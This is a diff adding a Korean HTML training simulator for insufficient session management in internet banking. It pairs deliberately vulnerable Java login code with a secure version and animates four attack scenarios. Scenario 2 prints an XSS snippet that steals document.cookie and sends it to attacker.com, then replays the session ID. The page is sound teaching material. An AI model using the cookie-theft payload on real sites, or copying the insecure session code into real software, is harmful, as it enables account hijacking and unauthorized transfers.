@@ -1,0 +1,728 @@
+<!DOCTYPE html>
+<html lang="ko">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>금융권 불충분한 세션 관리 시뮬레이터</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Noto+Sans+KR:wght@400;500;700;900&display=swap');
+        body { font-family: 'Noto Sans KR', sans-serif; }
+        .code-font { font-family: 'Courier New', monospace; }
+        .session-badge {
+            animation: pulse 2s infinite;
+        }
+        @keyframes pulse {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.5; }
+        }
+    </style>
+</head>
+<body class="bg-gray-100 p-4">
+
+    <!-- 평가기준 배너 -->
+    <div class="max-w-7xl mx-auto mb-4">
+        <div class="bg-red-600 text-white p-4 rounded-lg shadow-lg">
+            <div class="flex items-center gap-3">
+                <i class="fas fa-clipboard-check text-2xl"></i>
+                <div>
+                    <h1 class="font-bold text-lg">전자금융기반시설 보안 취약점 평가기준 - WEB-SER-045</h1>
+                    <p class="text-sm">불충분한 세션 관리 (IS) | 위험도: 4 (높음) | 통제구분: 5.2.4 세션 관리</p>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- 메인 컨텐츠 -->
+    <div class="max-w-7xl mx-auto">
+        <div class="grid grid-cols-1 lg:grid-cols-2 gap-4">
+            
+            <!-- 좌측: 취약한 시스템 -->
+            <div class="space-y-4">
+                
+                <!-- 은행 헤더 -->
+                <div class="bg-blue-600 text-white p-4 rounded-lg shadow-lg">
+                    <div class="flex items-center gap-3">
+                        <i class="fas fa-building-columns text-2xl"></i>
+                        <div>
+                            <h2 class="text-xl font-bold">우리은행</h2>
+                            <p class="text-sm">인터넷뱅킹 로그인 시스템</p>
+                        </div>
+                    </div>
+                    <div class="mt-2 bg-red-500 px-3 py-1 rounded text-sm">
+                        <i class="fas fa-exclamation-triangle"></i> 취약점: 세션 타임아웃 미설정
+                    </div>
+                </div>
+
+                <!-- 로그인 시뮬레이터 -->
+                <div class="bg-white p-5 rounded-lg shadow-lg">
+                    <h3 class="font-bold text-lg mb-3 flex items-center gap-2">
+                        <i class="fas fa-sign-in-alt text-blue-600"></i>
+                        인터넷뱅킹 로그인
+                    </h3>
+                    
+                    <div id="loginForm">
+                        <label class="block text-sm font-bold mb-2">사용자 ID</label>
+                        <input type="text" id="userId" 
+                               class="w-full p-2 border border-gray-300 rounded mb-3" 
+                               value="customer001">
+                        
+                        <label class="block text-sm font-bold mb-2">비밀번호</label>
+                        <input type="password" id="userPwd" 
+                               class="w-full p-2 border border-gray-300 rounded mb-3" 
+                               value="Password123!">
+                        
+                        <button onclick="login()" 
+                                class="w-full bg-blue-600 hover:bg-blue-700 text-white py-2 rounded">
+                            <i class="fas fa-sign-in-alt"></i> 로그인
+                        </button>
+                    </div>
+
+                    <div id="sessionInfo" class="hidden">
+                        <div class="bg-green-50 border-l-4 border-green-500 p-3 mb-3">
+                            <p class="text-sm font-bold mb-1">✅ 로그인 성공</p>
+                            <p class="text-xs">환영합니다, <span id="welcomeName"></span>님</p>
+                        </div>
+
+                        <div class="bg-white border rounded p-3 mb-3">
+                            <div class="flex justify-between items-center mb-2">
+                                <span class="text-sm font-bold">세션 ID:</span>
+                                <span id="sessionId" class="text-xs code-font text-gray-600"></span>
+                            </div>
+                            <div class="flex justify-between items-center mb-2">
+                                <span class="text-sm font-bold">로그인 시각:</span>
+                                <span id="loginTime" class="text-xs"></span>
+                            </div>
+                            <div class="flex justify-between items-center mb-2">
+                                <span class="text-sm font-bold">마지막 활동:</span>
+                                <span id="lastActivity" class="text-xs"></span>
+                            </div>
+                            <div class="flex justify-between items-center">
+                                <span class="text-sm font-bold">세션 상태:</span>
+                                <span id="sessionStatus" class="session-badge text-xs bg-green-500 text-white px-2 py-1 rounded">활성</span>
+                            </div>
+                        </div>
+
+                        <div class="flex gap-2">
+                            <button onclick="checkBalance()" 
+                                    class="flex-1 bg-green-600 hover:bg-green-700 text-white py-2 rounded text-sm">
+                                <i class="fas fa-wallet"></i> 잔액조회
+                            </button>
+                            <button onclick="logout()" 
+                                    class="bg-gray-500 hover:bg-gray-600 text-white px-4 py-2 rounded text-sm">
+                                <i class="fas fa-sign-out-alt"></i> 로그아웃
+                            </button>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- 세션 정보 상세 -->
+                <div class="bg-gray-900 text-green-400 p-4 rounded-lg shadow-lg">
+                    <h3 class="font-bold mb-3 flex items-center gap-2 text-white">
+                        <i class="fas fa-cookie-bite"></i>
+                        브라우저 쿠키 정보
+                    </h3>
+                    <div id="cookieInfo" class="code-font text-xs">
+                        <div class="text-gray-500">로그인 후 쿠키 정보가 표시됩니다</div>
+                    </div>
+                </div>
+
+                <!-- 공격 시나리오 버튼 -->
+                <div class="bg-gray-800 text-white p-4 rounded-lg shadow-lg">
+                    <h3 class="font-bold mb-3 flex items-center gap-2">
+                        <i class="fas fa-flask text-red-400"></i>
+                        공격 시나리오
+                    </h3>
+                    <div class="space-y-2">
+                        <button onclick="attackScenario(1)" 
+                                class="w-full text-left bg-red-900 hover:bg-red-800 px-3 py-2 rounded text-sm">
+                            <i class="fas fa-clock"></i> 시나리오 1: 세션 타임아웃 없음
+                        </button>
+                        <button onclick="attackScenario(2)" 
+                                class="w-full text-left bg-orange-900 hover:bg-orange-800 px-3 py-2 rounded text-sm">
+                            <i class="fas fa-copy"></i> 시나리오 2: 세션 하이재킹
+                        </button>
+                        <button onclick="attackScenario(3)" 
+                                class="w-full text-left bg-purple-900 hover:bg-purple-800 px-3 py-2 rounded text-sm">
+                            <i class="fas fa-users"></i> 시나리오 3: 동시 로그인 허용
+                        </button>
+                        <button onclick="attackScenario(4)" 
+                                class="w-full text-left bg-yellow-900 hover:bg-yellow-800 px-3 py-2 rounded text-sm">
+                            <i class="fas fa-desktop"></i> 시나리오 4: 공용 PC 세션 재사용
+                        </button>
+                    </div>
+                </div>
+
+                <!-- 취약한 코드 -->
+                <div class="bg-gray-900 text-white p-4 rounded-lg shadow-lg">
+                    <div class="flex justify-between items-center mb-3">
+                        <h3 class="font-bold text-red-400">
+                            <i class="fas fa-skull-crossbones"></i> 취약한 Java 코드
+                        </h3>
+                        <span class="text-xs bg-red-600 px-2 py-1 rounded">위험</span>
+                    </div>
+                    <pre class="code-font text-xs overflow-x-auto"><code><span class="text-gray-500">// ❌ 세션 관리 미흡</span>
+@PostMapping("/login")
+public String login(String userId, 
+                   String password,
+                   HttpSession session) {
+    
+    User user = userService.authenticate(userId, password);
+    
+    if (user != null) {
+        <span class="text-red-400">// 세션 타임아웃 미설정!</span>
+        <span class="text-red-400">// session.setMaxInactiveInterval(600); // 없음</span>
+        
+        session.setAttribute("userId", userId);
+        session.setAttribute("user", user);
+        
+        <span class="text-red-400">// 동시 로그인 체크 안 함!</span>
+        <span class="text-red-400">// 로그아웃 시 세션 무효화 안 함!</span>
+        
+        return "redirect:/main";
+    }
+    
+    return "login";
+}
+
+@GetMapping("/logout")
+public String logout(HttpSession session) {
+    <span class="text-red-400">// 세션 무효화 안 함!</span>
+    <span class="text-red-400">// session.invalidate(); // 없음</span>
+    
+    return "redirect:/login";
+}</code></pre>
+                </div>
+
+            </div>
+
+            <!-- 우측: 결과 및 안전한 코드 -->
+            <div class="space-y-4">
+                
+                <!-- 공격 실행 결과 -->
+                <div class="bg-white rounded-lg shadow-lg overflow-hidden">
+                    <div class="bg-gray-800 text-white px-4 py-3 flex justify-between items-center">
+                        <h3 class="font-bold">
+                            <i class="fas fa-terminal"></i> 공격 실행 결과
+                        </h3>
+                        <span id="statusBadge" class="text-xs bg-green-500 text-gray-900 px-3 py-1 rounded">
+                            대기중
+                        </span>
+                    </div>
+                    <div id="attackResult" class="p-5 min-h-[300px] bg-white">
+                        <div class="text-center text-gray-400 py-10">
+                            <i class="fas fa-shield-halved text-5xl mb-3 opacity-30"></i>
+                            <p class="text-sm">먼저 로그인하거나 공격 시나리오를 선택하세요</p>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- 공격 단계 -->
+                <div id="attackStages" class="hidden bg-red-100 border-l-4 border-red-600 p-4 rounded-lg">
+                    <h4 class="font-bold text-red-700 mb-2 flex items-center gap-2">
+                        <i class="fas fa-list-ol"></i> 공격 진행 단계
+                    </h4>
+                    <div id="stagesContent" class="text-sm text-red-700 space-y-1"></div>
+                </div>
+
+                <!-- 터미널 출력 -->
+                <div id="terminalBox" class="hidden bg-black text-green-400 p-4 rounded-lg shadow-lg">
+                    <div class="font-bold mb-2 text-xs">
+                        <i class="fas fa-terminal"></i> ATTACKER CONSOLE
+                    </div>
+                    <div id="terminalLines" class="code-font text-xs space-y-1 max-h-[200px] overflow-y-auto"></div>
+                </div>
+
+                <!-- 안전한 코드 -->
+                <div class="bg-gray-900 text-white p-4 rounded-lg shadow-lg">
+                    <div class="flex justify-between items-center mb-3">
+                        <h3 class="font-bold text-green-400">
+                            <i class="fas fa-shield-halved"></i> 안전한 Java 코드
+                        </h3>
+                        <span class="text-xs bg-green-600 px-2 py-1 rounded">권장</span>
+                    </div>
+                    <pre class="code-font text-xs overflow-x-auto max-h-[350px]"><code><span class="text-green-400">// ✅ 안전한 세션 관리</span>
+@PostMapping("/login")
+public String login(String userId, 
+                   String password,
+                   HttpServletRequest request,
+                   HttpSession session) {
+    
+    User user = userService.authenticate(userId, password);
+    
+    if (user == null) {
+        return "login";
+    }
+    
+    <span class="text-green-400">// 1. 기존 세션 무효화 (세션 고정 공격 방지)</span>
+    session.invalidate();
+    session = request.getSession(true);
+    
+    <span class="text-green-400">// 2. 세션 타임아웃 설정 (10분)</span>
+    session.setMaxInactiveInterval(600);
+    
+    <span class="text-green-400">// 3. 동시 로그인 체크</span>
+    if (sessionRegistry.isUserLoggedIn(userId)) {
+        <span class="text-green-400">// 기존 세션 강제 종료</span>
+        sessionRegistry.expireUserSessions(userId);
+    }
+    
+    <span class="text-green-400">// 4. 세션 등록</span>
+    session.setAttribute("userId", userId);
+    session.setAttribute("user", user);
+    session.setAttribute("loginTime", System.currentTimeMillis());
+    session.setAttribute("loginIp", request.getRemoteAddr());
+    
+    <span class="text-green-400">// 5. 세션 레지스트리에 등록</span>
+    sessionRegistry.registerSession(
+        session.getId(), 
+        userId, 
+        request.getRemoteAddr()
+    );
+    
+    <span class="text-green-400">// 6. 로그인 이력 저장</span>
+    auditService.logLogin(userId, request.getRemoteAddr());
+    
+    return "redirect:/main";
+}
+
+@GetMapping("/logout")
+public String logout(HttpSession session,
+                    HttpServletRequest request) {
+    
+    String userId = (String) session.getAttribute("userId");
+    
+    <span class="text-green-400">// 1. 세션 레지스트리에서 제거</span>
+    sessionRegistry.removeSession(session.getId());
+    
+    <span class="text-green-400">// 2. 세션 완전 무효화</span>
+    session.invalidate();
+    
+    <span class="text-green-400">// 3. 로그아웃 이력 저장</span>
+    auditService.logLogout(userId, request.getRemoteAddr());
+    
+    return "redirect:/login";
+}
+
+<span class="text-gray-500">// 세션 타임아웃 체크 (Filter)</span>
+@Override
+public void doFilter(ServletRequest request, 
+                    ServletResponse response,
+                    FilterChain chain) {
+    
+    HttpSession session = ((HttpServletRequest) request)
+        .getSession(false);
+    
+    if (session != null) {
+        long lastAccess = session.getLastAccessedTime();
+        long now = System.currentTimeMillis();
+        long inactiveTime = now - lastAccess;
+        
+        <span class="text-green-400">// 10분 비활성 시 세션 무효화</span>
+        if (inactiveTime > 600000) {
+            String userId = (String) session.getAttribute("userId");
+            sessionRegistry.removeSession(session.getId());
+            session.invalidate();
+            
+            auditService.logSessionTimeout(userId);
+            
+            ((HttpServletResponse) response)
+                .sendRedirect("/login?timeout=true");
+            return;
+        }
+        
+        <span class="text-green-400">// 마지막 활동 시간 갱신</span>
+        session.setAttribute("lastActivity", now);
+    }
+    
+    chain.doFilter(request, response);
+}
+
+<span class="text-gray-500">// 쿠키 보안 설정</span>
+@Bean
+public ServletContextInitializer servletContextInitializer() {
+    return servletContext -> {
+        SessionCookieConfig config = 
+            servletContext.getSessionCookieConfig();
+        
+        <span class="text-green-400">// HttpOnly: XSS 방어</span>
+        config.setHttpOnly(true);
+        
+        <span class="text-green-400">// Secure: HTTPS만 전송</span>
+        config.setSecure(true);
+        
+        <span class="text-green-400">// SameSite: CSRF 방어</span>
+        config.setAttribute("SameSite", "Strict");
+        
+        <span class="text-green-400">// 세션 타임아웃</span>
+        config.setMaxAge(600); // 10분
+    };
+}</code></pre>
+                </div>
+
+                <!-- 방어 체크리스트 -->
+                <div class="bg-white p-4 rounded-lg shadow-lg">
+                    <h3 class="font-bold mb-3 flex items-center gap-2">
+                        <i class="fas fa-list-check text-red-600"></i>
+                        세션 관리 보안 체크리스트
+                    </h3>
+                    <div class="space-y-2 text-sm">
+                        <div class="flex items-start gap-2">
+                            <i class="fas fa-check text-green-500 mt-1"></i>
+                            <div><strong>타임아웃 설정:</strong> 10분 비활성 시 자동 로그아웃</div>
+                        </div>
+                        <div class="flex items-start gap-2">
+                            <i class="fas fa-check text-green-500 mt-1"></i>
+                            <div><strong>세션 무효화:</strong> 로그아웃 시 완전 삭제</div>
+                        </div>
+                        <div class="flex items-start gap-2">
+                            <i class="fas fa-check text-green-500 mt-1"></i>
+                            <div><strong>동시 로그인 제한:</strong> 1개 세션만 허용</div>
+                        </div>
+                        <div class="flex items-start gap-2">
+                            <i class="fas fa-check text-green-500 mt-1"></i>
+                            <div><strong>HttpOnly 쿠키:</strong> JavaScript 접근 차단</div>
+                        </div>
+                        <div class="flex items-start gap-2">
+                            <i class="fas fa-check text-green-500 mt-1"></i>
+                            <div><strong>Secure 쿠키:</strong> HTTPS만 전송</div>
+                        </div>
+                        <div class="flex items-start gap-2">
+                            <i class="fas fa-check text-green-500 mt-1"></i>
+                            <div><strong>세션 고정 방지:</strong> 로그인 시 세션 재생성</div>
+                        </div>
+                        <div class="flex items-start gap-2">
+                            <i class="fas fa-check text-green-500 mt-1"></i>
+                            <div><strong>IP 검증:</strong> 세션 생성 IP와 일치 확인</div>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- 평가 판정 -->
+                <div id="judgementBox" class="hidden bg-gray-900 text-white p-4 rounded-lg">
+                    <h3 class="font-bold text-indigo-400 mb-2 text-sm">
+                        <i class="fas fa-gavel"></i> 평가 판정
+                    </h3>
+                    <div class="text-xs space-y-1">
+                        <div><strong>평가항목:</strong> WEB-SER-045 불충분한 세션 관리</div>
+                        <div><strong>판정:</strong> <span id="judgement" class="text-red-400">취약</span></div>
+                        <div><strong>근거:</strong> <span id="evidence"></span></div>
+                    </div>
+                </div>
+
+                <!-- 피해 시나리오 -->
+                <div id="damageBox" class="hidden bg-red-700 text-white p-4 rounded-lg">
+                    <h3 class="font-bold mb-3">
+                        <i class="fas fa-fire"></i> 실제 피해 사례
+                    </h3>
+                    <div class="space-y-2 text-sm">
+                        <div class="flex gap-2">
+                            <span class="font-bold">1.</span>
+                            <div><strong>공용 PC 세션 재사용</strong><br>다음 사용자가 계좌 접근</div>
+                        </div>
+                        <div class="flex gap-2">
+                            <span class="font-bold">2.</span>
+                            <div><strong>세션 하이재킹</strong><br>쿠키 탈취로 계정 탈취</div>
+                        </div>
+                        <div class="flex gap-2">
+                            <span class="font-bold">3.</span>
+                            <div><strong>무단 이체</strong><br>탈취한 세션으로 이체 실행</div>
+                        </div>
+                        <div class="flex gap-2">
+                            <span class="font-bold">4.</span>
+                            <div><strong>개인정보 유출</strong><br>세션으로 민감 정보 조회</div>
+                        </div>
+                    </div>
+                </div>
+
+            </div>
+        </div>
+    </div>
+
+    <script>
+        var currentSessionId = null;
+        var loginTimestamp = null;
+
+        function login() {
+            var userId = document.getElementById('userId').value;
+            currentSessionId = 'JSESSIONID_' + Math.random().toString(36).substr(2, 16);
+            loginTimestamp = new Date();
+            
+            document.getElementById('loginForm').classList.add('hidden');
+            document.getElementById('sessionInfo').classList.remove('hidden');
+            document.getElementById('welcomeName').textContent = userId;
+            document.getElementById('sessionId').textContent = currentSessionId;
+            document.getElementById('loginTime').textContent = loginTimestamp.toLocaleTimeString();
+            document.getElementById('lastActivity').textContent = new Date().toLocaleTimeString();
+            
+            document.getElementById('cookieInfo').innerHTML = 
+                '<div>JSESSIONID=' + currentSessionId + '</div>' +
+                '<div class="text-gray-500 mt-2">Domain: bank.com</div>' +
+                '<div class="text-gray-500">Path: /</div>' +
+                '<div class="text-red-400">Expires: Never (세션 쿠키)</div>' +
+                '<div class="text-red-400">HttpOnly: false</div>' +
+                '<div class="text-red-400">Secure: false</div>';
+        }
+
+        function logout() {
+            document.getElementById('loginForm').classList.remove('hidden');
+            document.getElementById('sessionInfo').classList.add('hidden');
+            document.getElementById('cookieInfo').innerHTML = 
+                '<div class="text-gray-500">로그인 후 쿠키 정보가 표시됩니다</div>';
+            currentSessionId = null;
+        }
+
+        function checkBalance() {
+            document.getElementById('lastActivity').textContent = new Date().toLocaleTimeString();
+            
+            var result = document.getElementById('attackResult');
+            result.innerHTML = 
+                '<div class="bg-blue-50 border-l-4 border-blue-500 p-4">' +
+                '<h4 class="font-bold text-blue-700 mb-2">💰 계좌 잔액 조회</h4>' +
+                '<div class="bg-white p-3 rounded">' +
+                '<p class="text-sm mb-1">예금주: 홍길동</p>' +
+                '<p class="text-sm mb-1">계좌번호: 110-123-456789</p>' +
+                '<p class="text-lg font-bold text-blue-600">잔액: 15,234,000원</p>' +
+                '</div></div>';
+        }
+
+        async function attackScenario(type) {
+            var result = document.getElementById('attackResult');
+            var badge = document.getElementById('statusBadge');
+            
+            document.getElementById('attackStages').classList.remove('hidden');
+            document.getElementById('terminalBox').classList.remove('hidden');
+            document.getElementById('judgementBox').classList.remove('hidden');
+            document.getElementById('damageBox').classList.remove('hidden');
+            document.getElementById('terminalLines').innerHTML = '';
+            
+            if (type === 1) {
+                // 시나리오 1: 세션 타임아웃 없음
+                document.getElementById('stagesContent').innerHTML = 
+                    '<div>1. 사용자 A가 로그인</div>' +
+                    '<div>2. 브라우저만 닫음 (로그아웃 X)</div>' +
+                    '<div>3. 30일 후에도 세션 유지</div>' +
+                    '<div>4. 다시 접속하면 자동 로그인!</div>';
+                
+                if (!currentSessionId) {
+                    login();
+                }
+                
+                addTerminalLine('> 사용자 로그인: customer001');
+                await sleep(500);
+                addTerminalLine('> 세션 생성: ' + currentSessionId);
+                await sleep(500);
+                addTerminalLine('> 브라우저 종료...');
+                await sleep(800);
+                addTerminalLine('> [30일 경과]', 'text-yellow-400');
+                await sleep(500);
+                addTerminalLine('> 브라우저 재실행...');
+                await sleep(500);
+                addTerminalLine('> [!] 세션 여전히 유효!', 'text-red-400');
+                await sleep(500);
+                addTerminalLine('> 자동 로그인 성공', 'text-red-400');
+                
+                result.innerHTML = 
+                    '<div class="bg-red-50 border-l-4 border-red-500 p-4">' +
+                    '<h4 class="font-bold text-red-700 mb-3">🚨 무제한 세션 유지</h4>' +
+                    '<div class="bg-white p-3 rounded mb-3 border">' +
+                    '<p class="text-sm font-bold mb-2">세션 타임라인:</p>' +
+                    '<table class="w-full text-xs">' +
+                    '<tr class="border-b"><th class="text-left py-1">시간</th><th class="text-left py-1">상태</th></tr>' +
+                    '<tr class="border-b"><td class="py-1">12월 1일</td><td class="py-1">로그인</td></tr>' +
+                    '<tr class="border-b"><td class="py-1">12월 1일</td><td class="py-1">브라우저 종료</td></tr>' +
+                    '<tr class="border-b bg-yellow-50"><td class="py-1">12월 15일</td><td class="py-1 text-yellow-600">세션 유지중</td></tr>' +
+                    '<tr class="bg-red-50"><td class="py-1">12월 31일</td><td class="py-1 text-red-600">세션 여전히 유효</td></tr>' +
+                    '</table></div>' +
+                    '<div class="bg-red-900 text-red-100 p-3 rounded text-sm">' +
+                    '<p class="font-bold">⚠️ 위험</p>' +
+                    '<p>공용 PC 사용 시 타인이 계좌 접근 가능</p>' +
+                    '<p>세션 하이재킹 위험 상승</p>' +
+                    '</div></div>';
+                
+                document.getElementById('evidence').textContent = '세션 타임아웃 미설정';
+                badge.textContent = '취약';
+                badge.className = 'text-xs bg-red-500 text-white px-3 py-1 rounded';
+                
+            } else if (type === 2) {
+                // 시나리오 2: 세션 하이재킹
+                document.getElementById('stagesContent').innerHTML = 
+                    '<div>1. XSS로 세션 쿠키 탈취</div>' +
+                    '<div>2. 공격자가 쿠키 복사</div>' +
+                    '<div>3. 공격자 브라우저에 쿠키 설정</div>' +
+                    '<div>4. 피해자 계정 접근 성공!</div>';
+                
+                if (!currentSessionId) {
+                    login();
+                }
+                
+                addTerminalLine('> XSS 공격으로 쿠키 탈취...');
+                await sleep(500);
+                addTerminalLine('> document.cookie:', 'text-yellow-400');
+                addTerminalLine('  JSESSIONID=' + currentSessionId, 'text-red-400');
+                await sleep(800);
+                addTerminalLine('> 공격자 브라우저에 쿠키 복사');
+                await sleep(500);
+                addTerminalLine('> 은행 사이트 접속...');
+                await sleep(800);
+                addTerminalLine('> [!] 로그인 없이 접근 성공!', 'text-red-400');
+                await sleep(500);
+                addTerminalLine('> 잔액 조회 가능', 'text-red-400');
+                addTerminalLine('> 이체 기능 접근 가능', 'text-red-400');
+                
+                result.innerHTML = 
+                    '<div class="bg-red-50 border-l-4 border-red-500 p-4">' +
+                    '<h4 class="font-bold text-red-700 mb-3">🚨 세션 하이재킹 성공</h4>' +
+                    '<div class="bg-gray-900 text-green-400 p-3 rounded mb-3 code-font text-xs">' +
+                    '<div class="text-white">// 피해자 브라우저 (XSS)</div>' +
+                    '<div>&lt;script&gt;</div>' +
+                    '<div class="ml-2">var cookie = document.cookie;</div>' +
+                    '<div class="ml-2 text-red-400">fetch(\'http://attacker.com/steal\',</div>' +
+                    '<div class="ml-4 text-red-400">{body: cookie});</div>' +
+                    '<div>&lt;/script&gt;</div>' +
+                    '<div class="mt-2 text-white">// 공격자 브라우저</div>' +
+                    '<div class="text-yellow-400">document.cookie = "JSESSIONID=' + currentSessionId.substr(0, 20) + '...";</div>' +
+                    '<div class="text-red-400">location.href = "https://bank.com/main";</div>' +
+                    '</div>' +
+                    '<div class="bg-red-900 text-red-100 p-3 rounded text-sm">' +
+                    '<p class="font-bold">💰 공격 성공</p>' +
+                    '<p>계좌 정보 조회 가능</p>' +
+                    '<p>무단 이체 실행 가능</p>' +
+                    '</div></div>';
+                
+                document.getElementById('evidence').textContent = 'HttpOnly 쿠키 미사용';
+                badge.textContent = '치명적';
+                badge.className = 'text-xs bg-red-600 text-white px-3 py-1 rounded';
+                
+            } else if (type === 3) {
+                // 시나리오 3: 동시 로그인
+                document.getElementById('stagesContent').innerHTML = 
+                    '<div>1. PC에서 로그인 (세션 A)</div>' +
+                    '<div>2. 모바일에서 로그인 (세션 B)</div>' +
+                    '<div>3. 공용 PC에서 로그인 (세션 C)</div>' +
+                    '<div>4. 모든 세션이 동시 활성!</div>';
+                
+                addTerminalLine('> PC 로그인: 세션 ABC123...');
+                await sleep(500);
+                addTerminalLine('> 모바일 로그인: 세션 DEF456...');
+                await sleep(500);
+                addTerminalLine('> 공용 PC 로그인: 세션 GHI789...');
+                await sleep(500);
+                addTerminalLine('> [!] 3개 세션 동시 활성!', 'text-red-400');
+                await sleep(800);
+                addTerminalLine('> PC에서 100만원 이체', 'text-yellow-400');
+                await sleep(300);
+                addTerminalLine('> 모바일에서 200만원 이체', 'text-yellow-400');
+                await sleep(300);
+                addTerminalLine('> 공용 PC 사용자가 조회...', 'text-red-400');
+                await sleep(500);
+                addTerminalLine('> [!] 타인이 계좌 접근!', 'text-red-400');
+                
+                result.innerHTML = 
+                    '<div class="bg-red-50 border-l-4 border-red-500 p-4">' +
+                    '<h4 class="font-bold text-red-700 mb-3">🚨 다중 세션 허용</h4>' +
+                    '<div class="bg-white p-3 rounded mb-3 border">' +
+                    '<p class="text-sm font-bold mb-2">활성 세션 목록:</p>' +
+                    '<table class="w-full text-xs">' +
+                    '<tr class="border-b bg-gray-50"><th class="text-left py-1">장소</th><th class="text-left py-1">세션 ID</th><th class="text-left py-1">상태</th></tr>' +
+                    '<tr class="border-b"><td class="py-1">본인 PC</td><td class="py-1 code-font">ABC123...</td><td class="py-1 text-green-600">활성</td></tr>' +
+                    '<tr class="border-b"><td class="py-1">본인 모바일</td><td class="py-1 code-font">DEF456...</td><td class="py-1 text-green-600">활성</td></tr>' +
+                    '<tr class="bg-red-50"><td class="py-1">공용 PC</td><td class="py-1 code-font">GHI789...</td><td class="py-1 text-red-600">활성</td></tr>' +
+                    '</table></div>' +
+                    '<div class="bg-red-900 text-red-100 p-3 rounded text-sm">' +
+                    '<p class="font-bold">⚠️ 보안 위험</p>' +
+                    '<p>공용 PC에 로그인 기록 남음</p>' +
+                    '<p>로그아웃 없이 이석 시 타인 접근 가능</p>' +
+                    '</div></div>';
+                
+                document.getElementById('evidence').textContent = '동시 로그인 제한 없음';
+                badge.textContent = '취약';
+                badge.className = 'text-xs bg-red-500 text-white px-3 py-1 rounded';
+                
+            } else if (type === 4) {
+                // 시나리오 4: 공용 PC
+                document.getElementById('stagesContent').innerHTML = 
+                    '<div>1. 공용 PC에서 로그인</div>' +
+                    '<div>2. 잔액 조회 후 이석</div>' +
+                    '<div>3. 로그아웃 안 함</div>' +
+                    '<div>4. 다음 사용자가 뒤로가기 클릭</div>' +
+                    '<div>5. 이전 사용자 계좌 노출!</div>';
+                
+                if (!currentSessionId) {
+                    login();
+                }
+                
+                addTerminalLine('> [PC방] 사용자 A 로그인');
+                await sleep(500);
+                addTerminalLine('> 잔액 조회: 15,234,000원');
+                await sleep(500);
+                addTerminalLine('> 브라우저만 닫음 (로그아웃 X)');
+                await sleep(800);
+                addTerminalLine('> [10분 후] 사용자 B가 같은 PC 사용', 'text-yellow-400');
+                await sleep(500);
+                addTerminalLine('> 브라우저 실행...');
+                await sleep(500);
+                addTerminalLine('> 뒤로가기 버튼 클릭');
+                await sleep(800);
+                addTerminalLine('> [!] 사용자 A의 계좌 화면 노출!', 'text-red-400');
+                await sleep(500);
+                addTerminalLine('> 이체 메뉴 접근 가능!', 'text-red-400');
+                
+                result.innerHTML = 
+                    '<div class="bg-red-50 border-l-4 border-red-500 p-4">' +
+                    '<h4 class="font-bold text-red-700 mb-3">🚨 공용 PC 세션 재사용</h4>' +
+                    '<div class="bg-white p-3 rounded mb-3 border">' +
+                    '<p class="text-sm font-bold mb-2">공격 시나리오:</p>' +
+                    '<div class="space-y-2 text-xs">' +
+                    '<div class="flex items-center gap-2">' +
+                    '<span class="bg-blue-200 px-2 py-1 rounded">14:00</span>' +
+                    '<span>사용자 A 로그인</span>' +
+                    '</div>' +
+                    '<div class="flex items-center gap-2">' +
+                    '<span class="bg-blue-200 px-2 py-1 rounded">14:05</span>' +
+                    '<span>잔액 조회 후 브라우저 닫음</span>' +
+                    '</div>' +
+                    '<div class="flex items-center gap-2">' +
+                    '<span class="bg-yellow-200 px-2 py-1 rounded">14:15</span>' +
+                    '<span>사용자 B가 같은 PC 사용</span>' +
+                    '</div>' +
+                    '<div class="flex items-center gap-2">' +
+                    '<span class="bg-red-200 px-2 py-1 rounded">14:16</span>' +
+                    '<span class="font-bold">뒤로가기로 사용자 A 계좌 접근!</span>' +
+                    '</div>' +
+                    '</div></div>' +
+                    '<div class="bg-blue-50 border border-blue-300 p-3 rounded mb-3">' +
+                    '<p class="text-sm font-bold mb-2">💰 노출된 계좌 정보:</p>' +
+                    '<p class="text-xs">예금주: 홍길동</p>' +
+                    '<p class="text-xs">계좌: 110-123-456789</p>' +
+                    '<p class="text-sm font-bold text-blue-600">잔액: 15,234,000원</p>' +
+                    '</div>' +
+                    '<div class="bg-red-900 text-red-100 p-3 rounded text-sm">' +
+                    '<p class="font-bold">💀 피해 가능성</p>' +
+                    '<p>개인정보 노출</p>' +
+                    '<p>무단 이체 실행 가능</p>' +
+                    '<p>거래내역 조회 가능</p>' +
+                    '</div></div>';
+                
+                document.getElementById('evidence').textContent = '로그아웃 시 세션 미파기';
+                badge.textContent = '치명적';
+                badge.className = 'text-xs bg-red-600 text-white px-3 py-1 rounded';
+            }
+        }
+
+        function addTerminalLine(text, color) {
+            var div = document.createElement('div');
+            div.className = color || 'text-green-400';
+            div.textContent = text;
+            document.getElementById('terminalLines').appendChild(div);
+            document.getElementById('terminalLines').scrollTop = 
+                document.getElementById('terminalLines').scrollHeight;
+        }
+
+        function sleep(ms) {
+            return new Promise(resolve => setTimeout(resolve, ms));
+        }
+    </script>
+</body>
+</html>
